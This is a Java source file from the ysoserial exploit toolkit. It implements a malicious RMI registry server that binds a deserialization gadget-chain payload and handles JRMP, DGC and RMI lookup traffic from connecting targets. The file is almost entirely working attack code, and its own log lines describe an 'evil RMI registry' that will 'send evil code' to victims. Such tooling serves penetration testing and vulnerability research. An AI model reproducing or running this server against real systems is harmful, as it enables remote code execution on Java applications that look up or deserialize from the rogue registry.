package ysoserial.exploit;

import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.util.Gadgets;
import javax.net.ServerSocketFactory;
import java.io.*;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.rmi.MarshalException;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RMISocketFactory;
import java.rmi.server.UID;
import java.util.Arrays;

public class RMIBypassServer {
    public static void main(String[] args) throws Exception{

        if (args.length < 3) {
            System.err.println(RMIBypassServer.class.getName() + " <port> <payload_type> <payload_arg>");
            System.exit(-1);
        }


        ServerSocket ss = null;
        SMRMISocket SMSS = new SMRMISocket();
        SMSS.setPort(8888);
        System.setProperty("java.rmi.server.hostname", "127.0.0.1");
        try {
            RMISocketFactory.setSocketFactory(SMSS);
            System.out.println("[-] Creating SocketFactory on port " + String.valueOf(8888));
        } catch (Exception localException) {
            localException.printStackTrace();
            System.out.println("error in SMRMISocket");
        }
        int port = Integer.parseInt(args[0]);

        Registry registry = LocateRegistry.createRegistry(port);
        System.out.println("[-] Creating evil RMI registry on port " + String.valueOf(1099));

        Object payload = ObjectPayload.Utils.makePayloadObject(args[1], args[2]);
        String name = "pwned" + System.nanoTime();
        System.out.println(String.format("* [-] Creating evil RMI Naming   rmi://ip:%s/%s", port, name));

        Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(name, payload), Remote.class);
        registry.bind(name, remote);
        ss = SMSS.getSS();
        handleSocket(ss);
    }

    private static void handleSocket(ServerSocket ss) {
        Socket s = null;
        try {
            System.out.println("[-] waiting target connect RMI SocketFactory ...");
            while ((s = ss.accept()) != null) {
                InetSocketAddress remote = (InetSocketAddress)s.getRemoteSocketAddress();
                System.err.println("[*] Have connection from " + remote);
                InputStream is = s.getInputStream();
                InputStream bufIn = is.markSupported() ? is : new BufferedInputStream(is);
                bufIn.mark(4);
                try {
                    DataInputStream in = new DataInputStream(bufIn);
                    int magic = in.readInt();
                    short version = in.readShort();
                    if (magic != 1246907721 || version != 2) {
                        s.close();
                        continue;
                    }
                    OutputStream sockOut = s.getOutputStream();
                    BufferedOutputStream bufOut = new BufferedOutputStream(sockOut);
                    try {
                        DataOutputStream out = new DataOutputStream(bufOut);
                        byte protocol = in.readByte();
                        switch (protocol) {
                            case 75:
                                out.writeByte(78);
                                if (remote.getHostName() != null) {
                                    out.writeUTF(remote.getHostName());
                                } else {
                                    out.writeUTF(remote.getAddress().toString());
                                }
                                out.writeInt(remote.getPort());
                                out.flush();
                                in.readUTF();
                                in.readInt();
                            case 76:
                                doMessage(s, in, out);
                                break;
                            default:
                                System.err.println("Unsupported protocol");
                                s.close();
                                continue;
                        }
                        bufOut.flush();
                        out.flush();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
                System.err.println("[*] Start send evil code to " + remote.getHostName());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static class SMRMISocket extends RMISocketFactory {
        private ServerSocket ss;

        private int port = 53;

        public Socket createSocket(String host, int port) throws IOException {
            return new Socket(host, port);
        }

        public ServerSocket createServerSocket(int port) throws IOException {
            if (port == 0)
                port = this.port;
            this.ss = ServerSocketFactory.getDefault().createServerSocket(port);
            return this.ss;
        }

        public ServerSocket getSS() {
            return this.ss;
        }

        private void setPort(int port) {
            this.port = port;
        }
    }

    private static boolean handleRMI(ObjectInputStream ois, DataOutputStream out) throws Exception {
        int method = ois.readInt();
        ois.readLong();
        if (method != 2)
            return false;
        String object = (String)ois.readObject();
        System.err.println("[*] Is RMI.lookup call for " + object + " " + method);
        return true;
    }

    private static void doMessage(Socket s, DataInputStream in, DataOutputStream out) throws Exception {
        System.err.println("[*] Reading message...");
        int op = in.read();
        switch (op) {
            case 80:
                doCall(in, out);
                break;
            case 82:
                out.writeByte(83);
                break;
            case 84:
                UID.read(in);
                break;
            default:
                throw new IOException("unknown transport op " + op);
        }
        s.close();
    }

    private static void doCall(DataInputStream in, DataOutputStream out) throws Exception {
        ObjID read;
        ObjectInputStream ois = new ObjectInputStream(in) {
            protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
                if ("[Ljava.rmi.server.ObjID;".equals(desc.getName()))
                    return ObjID[].class;
                if ("java.rmi.server.ObjID".equals(desc.getName()))
                    return ObjID.class;
                if ("java.rmi.server.UID".equals(desc.getName()))
                    return UID.class;
                if ("java.lang.String".equals(desc.getName()))
                    return String.class;
                throw new IOException("Not allowed to read object");
            }
        };
        try {
            read = ObjID.read(ois);
        } catch (IOException e) {
            throw new MarshalException("unable to read objID", e);
        }
        if (read.hashCode() == 2) {
            handleDGC(ois);
        } else if (read.hashCode() == 0) {
            handleRMI(ois, out);
        }
    }

    private static void handleDGC(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ois.readInt();
        ois.readLong();
        System.err.println("[-] Is DGC call for " + Arrays.toString((Object[])ois.readObject()));
    }

}
